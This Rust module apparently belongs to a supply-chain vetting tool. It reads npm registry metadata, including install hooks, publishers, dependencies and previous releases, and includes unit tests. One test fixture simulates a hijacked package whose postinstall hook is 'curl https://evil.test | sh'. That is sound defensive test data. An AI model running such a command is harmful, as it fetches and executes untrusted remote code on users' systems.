//! npm registry access: one packument fetch per package, plus a best-effort
//! download count.
//!
//! Base URLs are overridable through `DEPVET_REGISTRY_BASE` and
//! `DEPVET_DOWNLOADS_BASE` so tests (and registry mirrors) never touch the
//! public registry.

use std::collections::BTreeMap;
use std::sync::Arc;

use serde::Deserialize;

use crate::date;
use crate::http::{HttpClient, HttpError};
use crate::model::{InstallScript, PackageSpec};

const DEFAULT_REGISTRY: &str = "https://registry.npmjs.org";
const DEFAULT_DOWNLOADS: &str = "https://api.npmjs.org/downloads/point";
const INSTALL_HOOKS: [&str; 3] = ["preinstall", "install", "postinstall"];

/// Everything dep-vet needs to know about one resolved package version.
#[derive(Debug, Clone)]
pub struct PackageMeta {
    pub name: String,
    pub version: String,
    pub first_published_at: Option<i64>,
    pub published_at: Option<i64>,
    pub maintainers: Vec<String>,
    pub publisher: Option<String>,
    /// False when the ecosystem has no maintainer list we could read.
    pub maintainers_known: bool,
    pub install_scripts: Vec<InstallScript>,
    /// PyPI: only an sdist is published, so installing builds it (PEP 517).
    pub build_from_source: bool,
    pub repository: Option<String>,
    pub deprecated: Option<String>,
    pub registry_url: String,
    /// Where a human should look this version up. `None` uses the
    /// ecosystem's default page.
    pub review_url: Option<String>,
    /// Highest published stable version, when the client can tell.
    pub latest_version: Option<String>,
    /// Weekly downloads of the popular name this package resembles, when npm
    /// was asked. Lets the verdict compare the two instead of trusting a seed.
    pub candidate_weekly_downloads: Option<u64>,
    /// The release before the audited one, when the client could tell.
    pub release: ReleaseHistory,
}

/// What the previous release looked like. Empty means "no history", never
/// "nothing changed": signals must not read silence as agreement.
#[derive(Debug, Clone, Default)]
pub struct ReleaseHistory {
    pub previous_version: Option<String>,
    pub previous_published_at: Option<i64>,
    pub previous_publisher: Option<String>,
    pub previous_install_scripts: Vec<InstallScript>,
    pub previous_dependencies: Vec<String>,
    pub dependencies: Vec<String>,
}

#[derive(Debug, thiserror::Error)]
pub enum RegistryError {
    #[error("package '{0}' was not found on npm")]
    PackageNotFound(String),
    #[error(
        "'{version}' of '{package}' was not found on npm; dep-vet takes an exact version or dist-tag, not a range"
    )]
    VersionNotFound { package: String, version: String },
    #[error(
        "'{version}' of '{package}' was not found on npm; registry version keys omit build metadata, try '{suggestion}'"
    )]
    BuildMetadataVersion {
        package: String,
        version: String,
        suggestion: String,
    },
    #[error("npm registry request failed: {0}")]
    Http(String),
    #[error("npm registry sent a response dep-vet could not read: {0}")]
    Decode(String),
}

/// History signals only concern releases this recent; older versions are
/// covered by advisories, and fetching their history would cost requests that
/// change nothing.
pub const HISTORY_WINDOW_DAYS: i64 = 30;

pub struct RegistryClient {
    http: Arc<HttpClient>,
    registry_base: String,
    downloads_base: String,
}

impl RegistryClient {
    pub fn from_env(http: Arc<HttpClient>) -> Self {
        let registry =
            std::env::var("DEPVET_REGISTRY_BASE").unwrap_or_else(|_| DEFAULT_REGISTRY.to_string());
        let downloads = std::env::var("DEPVET_DOWNLOADS_BASE")
            .unwrap_or_else(|_| DEFAULT_DOWNLOADS.to_string());
        Self::new(http, registry, downloads)
    }

    pub fn new(
        http: Arc<HttpClient>,
        registry_base: impl Into<String>,
        downloads_base: impl Into<String>,
    ) -> Self {
        Self {
            http,
            registry_base: registry_base.into(),
            downloads_base: downloads_base.into(),
        }
    }

    pub fn package_url(&self, name: &str) -> String {
        format!(
            "{}/{}",
            self.registry_base.trim_end_matches('/'),
            encode_name(name)
        )
    }

    pub fn fetch(&self, spec: &PackageSpec) -> Result<PackageMeta, RegistryError> {
        let url = self.package_url(&spec.name);
        let body = match self.http.get(&url) {
            Ok(body) => body,
            Err(HttpError::Status {
                status: 404 | 403, ..
            }) => {
                return Err(RegistryError::PackageNotFound(spec.name.clone()));
            }
            Err(error) => return Err(RegistryError::Http(error.to_string())),
        };
        parse_packument(spec, &body, &url)
    }

    /// Best effort: download counts are a nice-to-have, never a reason to fail.
    pub fn weekly_downloads(&self, name: &str) -> Option<u64> {
        let names = [name.to_string()];
        self.weekly_downloads_many(&names).remove(name)
    }

    /// History signals only concern releases this recent; older versions are
    /// covered by advisories, and fetching their history would cost requests that
    /// change nothing.
    pub const HISTORY_WINDOW_DAYS: i64 = 30;

    /// Weekly downloads for many packages. The endpoint takes up to 128
    /// comma-separated names; names absent from a response are absent here.
    pub fn weekly_downloads_many(
        &self,
        names: &[String],
    ) -> std::collections::HashMap<String, u64> {
        let mut downloads = std::collections::HashMap::new();
        // npm's bulk endpoint rejects scoped packages ("not currently
        // supported in bulk lookups"), so those go one at a time.
        let bulk: Vec<String> = names
            .iter()
            .filter(|name| !is_scoped(name))
            .cloned()
            .collect();
        for chunk in bulk.chunks(MAX_DOWNLOAD_NAMES) {
            downloads.extend(self.download_chunk(chunk));
        }
        for name in names.iter().filter(|name| is_scoped(name)) {
            downloads.extend(self.download_chunk(std::slice::from_ref(name)));
        }
        downloads
    }

    fn download_chunk(&self, names: &[String]) -> std::collections::HashMap<String, u64> {
        let url = format!(
            "{}/{}",
            self.downloads_base.trim_end_matches('/'),
            downloads_path(names)
        );
        match self.http.get(&url) {
            Ok(body) => parse_downloads(&body, names),
            Err(_) => std::collections::HashMap::new(),
        }
    }
}

/// The most recently published version strictly older than the audited one.
/// Timestamps decide, never list order: registries do not promise ordering, and
/// a backport can be published after a major.
pub fn previous_release(
    versions: &[(&str, Option<i64>)],
    current_version: &str,
    current_time: Option<i64>,
) -> Option<(String, i64)> {
    let current = current_time?;
    versions
        .iter()
        .filter(|(version, _)| *version != current_version)
        .filter_map(|(version, time)| time.map(|time| (*version, time)))
        .filter(|(_, time)| *time < current)
        .max_by_key(|(_, time)| *time)
        .map(|(version, time)| (version.to_string(), time))
}

/// Scoped names travel as one path segment: `@scope%2Fname`.
fn encode_name(name: &str) -> String {
    name.replace('/', "%2F")
}

/// The npm downloads API accepts at most 128 names per request, and none of
/// them may be scoped.
pub const MAX_DOWNLOAD_NAMES: usize = 128;

fn is_scoped(name: &str) -> bool {
    name.starts_with('@')
}

/// npm answers a bare `{downloads}` object for one name and a map keyed by
/// package for several; accept both.
fn parse_downloads(body: &str, requested: &[String]) -> std::collections::HashMap<String, u64> {
    let mut downloads = std::collections::HashMap::new();
    let Ok(value) = serde_json::from_str::<serde_json::Value>(body) else {
        return downloads;
    };
    if let Some(count) = value.get("downloads").and_then(serde_json::Value::as_u64) {
        if let Some(name) = requested.first() {
            downloads.insert(name.clone(), count);
        }
        return downloads;
    }
    if let Some(rows) = value.as_object() {
        for (name, row) in rows {
            if let Some(count) = row.get("downloads").and_then(serde_json::Value::as_u64) {
                downloads.insert(name.clone(), count);
            }
        }
    }
    downloads
}

fn downloads_path(names: &[String]) -> String {
    let joined = names
        .iter()
        .map(|name| encode_name(name))
        .collect::<Vec<_>>()
        .join(",");
    format!("last-week/{joined}")
}

pub fn package_page_url(name: &str, version: &str) -> String {
    format!("https://www.npmjs.com/package/{name}/v/{version}")
}

#[derive(Debug, Deserialize)]
struct Packument {
    #[serde(default)]
    name: Option<String>,
    #[serde(default)]
    maintainers: Vec<User>,
    #[serde(default)]
    time: BTreeMap<String, String>,
    #[serde(rename = "dist-tags", default)]
    dist_tags: BTreeMap<String, String>,
    #[serde(default)]
    versions: BTreeMap<String, VersionDoc>,
    #[serde(default)]
    repository: Option<RepoField>,
}

fn install_scripts(doc: &VersionDoc) -> Vec<InstallScript> {
    doc.scripts
        .iter()
        .filter(|(hook, _)| INSTALL_HOOKS.contains(&hook.as_str()))
        .map(|(name, command)| InstallScript {
            name: name.clone(),
            command: command.clone(),
        })
        .collect()
}

#[derive(Debug, Deserialize)]
struct VersionDoc {
    #[serde(default)]
    scripts: BTreeMap<String, String>,
    #[serde(default)]
    dependencies: BTreeMap<String, String>,
    #[serde(default)]
    deprecated: Option<serde_json::Value>,
    #[serde(default)]
    repository: Option<RepoField>,
    #[serde(rename = "_npmUser", default)]
    npm_user: Option<User>,
}

#[derive(Debug, Deserialize)]
struct User {
    #[serde(default)]
    name: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum RepoField {
    Url(String),
    Object {
        #[serde(default)]
        url: Option<String>,
    },
}

fn parse_packument(
    spec: &PackageSpec,
    body: &str,
    url: &str,
) -> Result<PackageMeta, RegistryError> {
    let packument: Packument = serde_json::from_str(body)
        .map_err(|error| RegistryError::Decode(format!("{url}: {error}")))?;

    let version = match &spec.version {
        Some(requested) if packument.versions.contains_key(requested) => requested.clone(),
        Some(requested) => match packument.dist_tags.get(requested) {
            Some(tagged) => tagged.clone(),
            None => return Err(version_not_found(&spec.name, requested)),
        },
        None => packument.dist_tags.get("latest").cloned().ok_or_else(|| {
            RegistryError::VersionNotFound {
                package: spec.name.clone(),
                version: "latest".to_string(),
            }
        })?,
    };

    let doc = packument.versions.get(&version).ok_or_else(|| {
        RegistryError::Decode(format!("{url}: dist-tag '{version}' has no version entry"))
    })?;

    let hooks = install_scripts(doc);

    let repository = doc
        .repository
        .as_ref()
        .or(packument.repository.as_ref())
        .and_then(repo_url)
        .map(|url| normalize_repository(&url));

    let published_at = packument
        .time
        .get(&version)
        .and_then(|raw| date::parse_timestamp(raw));
    let latest_version = packument.dist_tags.get("latest").cloned();
    let previous = {
        let entries: Vec<(&str, Option<i64>)> = packument
            .time
            .iter()
            .filter(|(key, _)| !matches!(key.as_str(), "created" | "modified"))
            .map(|(key, raw)| (key.as_str(), date::parse_timestamp(raw)))
            .collect();
        previous_release(&entries, &version, published_at)
    };

    let previous_version = previous.as_ref().map(|(version, _)| version.clone());
    let previous_time = previous.as_ref().map(|(_, time)| *time);
    let previous_doc = previous_version
        .as_ref()
        .and_then(|version| packument.versions.get(version));

    Ok(PackageMeta {
        name: packument.name.unwrap_or_else(|| spec.name.clone()),
        version,
        first_published_at: packument
            .time
            .get("created")
            .and_then(|raw| date::parse_timestamp(raw)),
        published_at,
        maintainers: packument
            .maintainers
            .iter()
            .filter_map(|user| user.name.clone())
            .collect(),
        publisher: doc.npm_user.as_ref().and_then(|user| user.name.clone()),
        maintainers_known: true,
        install_scripts: hooks,
        build_from_source: false,
        repository,
        deprecated: normalize_deprecated(doc.deprecated.clone()),
        registry_url: url.to_string(),
        review_url: None,
        latest_version,
        candidate_weekly_downloads: None,
        release: ReleaseHistory {
            previous_version,
            previous_published_at: previous_time,
            previous_publisher: previous_doc
                .and_then(|doc| doc.npm_user.as_ref())
                .and_then(|user| user.name.clone()),
            previous_install_scripts: previous_doc.map(install_scripts).unwrap_or_default(),
            previous_dependencies: previous_doc
                .map(|doc| doc.dependencies.keys().cloned().collect())
                .unwrap_or_default(),
            dependencies: doc.dependencies.keys().cloned().collect(),
        },
    })
}

fn version_not_found(package: &str, requested: &str) -> RegistryError {
    match requested.split_once('+') {
        Some((base, _)) => RegistryError::BuildMetadataVersion {
            package: package.to_string(),
            version: requested.to_string(),
            suggestion: base.to_string(),
        },
        None => RegistryError::VersionNotFound {
            package: package.to_string(),
            version: requested.to_string(),
        },
    }
}

fn repo_url(field: &RepoField) -> Option<String> {
    match field {
        RepoField::Url(url) => Some(url.clone()),
        RepoField::Object { url } => url.clone(),
    }
}

fn normalize_deprecated(value: Option<serde_json::Value>) -> Option<String> {
    match value? {
        serde_json::Value::String(message) if !message.trim().is_empty() => Some(message),
        serde_json::Value::String(_) | serde_json::Value::Bool(true) => {
            Some("deprecated by the publisher".to_string())
        }
        _ => None,
    }
}

/// Turns shorthand and `git+` URLs into something a human can click.
pub(crate) fn normalize_repository(raw: &str) -> String {
    let trimmed = raw.trim().trim_start_matches("git+");
    if let Some(rest) = trimmed.strip_prefix("github:") {
        return format!("https://github.com/{rest}");
    }
    if let Some(rest) = trimmed.strip_prefix("gitlab:") {
        return format!("https://gitlab.com/{rest}");
    }
    if let Some(rest) = trimmed.strip_prefix("bitbucket:") {
        return format!("https://bitbucket.org/{rest}");
    }
    trimmed.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec(name: &str, version: Option<&str>) -> PackageSpec {
        PackageSpec {
            name: name.to_string(),
            version: version.map(str::to_string),
        }
    }

    fn fetch(body: &str, version: Option<&str>) -> Result<PackageMeta, RegistryError> {
        parse_packument(
            &spec("evil-pkg", version),
            body,
            "https://example.test/evil-pkg",
        )
    }

    const PACKUMENT: &str = r#"{
        "name": "evil-pkg",
        "dist-tags": { "latest": "1.0.0", "next": "1.1.0-beta.1" },
        "maintainers": [{ "name": "alice" }, { "name": "bob" }],
        "time": {
            "created": "2024-01-01T00:00:00.000Z",
            "modified": "2026-01-01T00:00:00.000Z",
            "1.0.0": "2026-01-01T00:00:00.000Z",
            "1.1.0-beta.1": "2026-02-01T00:00:00.000Z"
        },
        "repository": { "type": "git", "url": "git+https://github.com/evil/pkg.git" },
        "versions": {
            "1.0.0": {
                "scripts": { "postinstall": "node setup.js", "test": "jest" },
                "_npmUser": { "name": "alice" }
            },
            "1.1.0-beta.1": {
                "scripts": {},
                "_npmUser": { "name": "mallory" },
                "deprecated": "use 1.0.0"
            }
        }
    }"#;

    #[test]
    fn scoped_names_are_not_sent_to_the_bulk_endpoint() {
        assert!(is_scoped("@types/node"));
        assert!(!is_scoped("chalk"));
    }

    #[test]
    fn downloads_parse_both_response_shapes() {
        // One name: npm answers a bare object.
        let single = parse_downloads(
            r#"{"downloads":42,"package":"chalk"}"#,
            &["chalk".to_string()],
        );
        assert_eq!(single.get("chalk"), Some(&42));

        // Several names: npm answers an object keyed by package.
        let many = parse_downloads(
            r#"{"chalk":{"downloads":7},"express":{"downloads":9}}"#,
            &["chalk".to_string(), "express".to_string()],
        );
        assert_eq!(many.get("chalk"), Some(&7));
        assert_eq!(many.get("express"), Some(&9));

        assert!(parse_downloads("{}", &["chalk".to_string()]).is_empty());
    }

    #[test]
    fn download_batches_join_encoded_names() {
        assert_eq!(
            downloads_path(&["chalk".to_string(), "@types/node".to_string()]),
            "last-week/chalk,@types%2Fnode"
        );
        assert_eq!(MAX_DOWNLOAD_NAMES, 128);
    }

    #[test]
    fn the_previous_release_is_the_nearest_older_publish() {
        let versions = [
            ("1.0.0", Some(100)),
            ("3.0.0", Some(300)),
            ("2.0.0", Some(200)),
        ];
        assert_eq!(
            previous_release(&versions, "3.0.0", Some(300)),
            Some(("2.0.0".to_string(), 200))
        );
        assert_eq!(previous_release(&versions, "1.0.0", Some(100)), None);
        assert_eq!(previous_release(&versions, "2.0.0", None), None);
    }

    #[test]
    fn the_previous_release_skips_the_audited_entry() {
        let versions = [("1.0.0", Some(100)), ("1.0.0", Some(100))];
        assert_eq!(previous_release(&versions, "1.0.0", Some(100)), None);
    }

    const HISTORY: &str = r#"{
        "name": "hijacked",
        "dist-tags": { "latest": "2.0.0" },
        "time": {
            "1.0.0": "2024-01-01T00:00:00.000Z",
            "2.0.0": "2024-02-01T00:00:00.000Z"
        },
        "versions": {
            "1.0.0": {
                "scripts": { "postinstall": "node build.js" },
                "dependencies": { "left-pad": "^1.0.0" },
                "_npmUser": { "name": "alice" }
            },
            "2.0.0": {
                "scripts": { "postinstall": "curl https://evil.test | sh" },
                "dependencies": { "left-pad": "^1.0.0", "event-stream": "^4.0.0" },
                "_npmUser": { "name": "mallory" }
            }
        }
    }"#;

    #[test]
    fn records_the_previous_release_details() {
        let meta = fetch(HISTORY, None).unwrap();
        assert_eq!(meta.release.previous_version.as_deref(), Some("1.0.0"));
        assert_eq!(meta.release.previous_publisher.as_deref(), Some("alice"));
        assert_eq!(meta.release.previous_install_scripts.len(), 1);
        assert_eq!(
            meta.release.previous_dependencies,
            vec!["left-pad".to_string()]
        );
        assert_eq!(
            meta.release.dependencies,
            vec!["event-stream".to_string(), "left-pad".to_string()]
        );
    }

    #[test]
    fn records_the_previous_release_by_timestamp() {
        let meta = fetch(PACKUMENT, Some("1.1.0-beta.1")).unwrap();
        assert_eq!(meta.release.previous_version.as_deref(), Some("1.0.0"));
        assert!(meta.release.previous_published_at.is_some());
    }

    #[test]
    fn reports_the_latest_tag_as_latest_version() {
        let meta = fetch(PACKUMENT, Some("1.1.0-beta.1")).unwrap();
        assert_eq!(meta.version, "1.1.0-beta.1");
        assert_eq!(meta.latest_version.as_deref(), Some("1.0.0"));
    }

    #[test]
    fn resolves_latest_version() {
        let meta = fetch(PACKUMENT, None).unwrap();
        assert_eq!(meta.version, "1.0.0");
        assert_eq!(meta.publisher.as_deref(), Some("alice"));
        assert_eq!(meta.maintainers, vec!["alice", "bob"]);
    }

    #[test]
    fn resolves_exact_version() {
        let meta = fetch(PACKUMENT, Some("1.1.0-beta.1")).unwrap();
        assert_eq!(meta.version, "1.1.0-beta.1");
        assert_eq!(meta.deprecated.as_deref(), Some("use 1.0.0"));
        assert_eq!(
            meta.published_at,
            date::parse_timestamp("2026-02-01T00:00:00Z")
        );
    }

    #[test]
    fn resolves_dist_tag() {
        let meta = fetch(PACKUMENT, Some("next")).unwrap();
        assert_eq!(meta.version, "1.1.0-beta.1");
    }

    #[test]
    fn only_install_hooks_are_reported() {
        let meta = fetch(PACKUMENT, None).unwrap();
        assert_eq!(
            meta.install_scripts,
            vec![InstallScript {
                name: "postinstall".to_string(),
                command: "node setup.js".to_string()
            }]
        );
    }

    #[test]
    fn missing_version_is_an_error_not_a_panic() {
        let error = fetch(PACKUMENT, Some("9.9.9")).unwrap_err();
        assert!(matches!(error, RegistryError::VersionNotFound { .. }));
    }

    #[test]
    fn range_like_version_is_rejected_with_guidance() {
        let error = fetch(PACKUMENT, Some("^1.0.0")).unwrap_err();
        assert!(error.to_string().contains("exact version or dist-tag"));
    }

    #[test]
    fn build_metadata_version_gets_specific_guidance() {
        let error = fetch(PACKUMENT, Some("1.0.0+build.5")).unwrap_err();
        let message = error.to_string();
        assert!(
            message.contains("omit build metadata"),
            "unhelpful message: {message}"
        );
        assert!(message.contains("1.0.0"));
    }

    #[test]
    fn malformed_json_is_a_decode_error() {
        let error = fetch("{ not json", None).unwrap_err();
        assert!(matches!(error, RegistryError::Decode(_)));
    }

    #[test]
    fn missing_optional_fields_still_produce_a_report() {
        let body = r#"{ "name": "bare", "dist-tags": { "latest": "0.0.1" }, "versions": { "0.0.1": {} } }"#;
        let meta = fetch(body, None).unwrap();
        assert_eq!(meta.version, "0.0.1");
        assert_eq!(meta.first_published_at, None);
        assert_eq!(meta.published_at, None);
        assert!(meta.install_scripts.is_empty());
        assert_eq!(meta.repository, None);
        assert_eq!(meta.publisher, None);
        assert_eq!(meta.deprecated, None);
    }

    #[test]
    fn missing_latest_tag_is_an_error() {
        let body = r#"{ "name": "bare", "versions": { "0.0.1": {} } }"#;
        assert!(matches!(
            fetch(body, None),
            Err(RegistryError::VersionNotFound { .. })
        ));
    }

    #[test]
    fn deprecated_false_and_null_are_ignored() {
        let body = r#"{
            "name": "x", "dist-tags": { "latest": "1.0.0" },
            "versions": { "1.0.0": { "deprecated": false } }
        }"#;
        assert_eq!(fetch(body, None).unwrap().deprecated, None);
        let body = body.replace("false", "null");
        assert_eq!(fetch(&body, None).unwrap().deprecated, None);
    }

    #[test]
    fn deprecated_true_gets_a_placeholder_message() {
        let body = r#"{
            "name": "x", "dist-tags": { "latest": "1.0.0" },
            "versions": { "1.0.0": { "deprecated": true } }
        }"#;
        assert_eq!(
            fetch(body, None).unwrap().deprecated.as_deref(),
            Some("deprecated by the publisher")
        );
    }

    #[test]
    fn string_repository_is_supported() {
        let body = r#"{
            "name": "x", "dist-tags": { "latest": "1.0.0" },
            "versions": { "1.0.0": { "repository": "github:owner/repo" } }
        }"#;
        assert_eq!(
            fetch(body, None).unwrap().repository.as_deref(),
            Some("https://github.com/owner/repo")
        );
    }

    #[test]
    fn package_level_repository_is_a_fallback() {
        let body = r#"{
            "name": "x", "dist-tags": { "latest": "1.0.0" },
            "repository": "https://example.test/x.git",
            "versions": { "1.0.0": {} }
        }"#;
        assert_eq!(
            fetch(body, None).unwrap().repository.as_deref(),
            Some("https://example.test/x.git")
        );
    }

    #[test]
    fn normalizes_common_repository_shorthands() {
        assert_eq!(
            normalize_repository("git+https://github.com/a/b.git"),
            "https://github.com/a/b.git"
        );
        assert_eq!(normalize_repository("github:a/b"), "https://github.com/a/b");
        assert_eq!(normalize_repository("gitlab:a/b"), "https://gitlab.com/a/b");
        assert_eq!(
            normalize_repository("bitbucket:a/b"),
            "https://bitbucket.org/a/b"
        );
        assert_eq!(
            normalize_repository("  https://example.test/x  "),
            "https://example.test/x"
        );
    }

    #[test]
    fn scoped_names_are_encoded_into_one_path_segment() {
        assert_eq!(encode_name("@types/node"), "@types%2Fnode");
        assert_eq!(encode_name("express"), "express");
    }
}
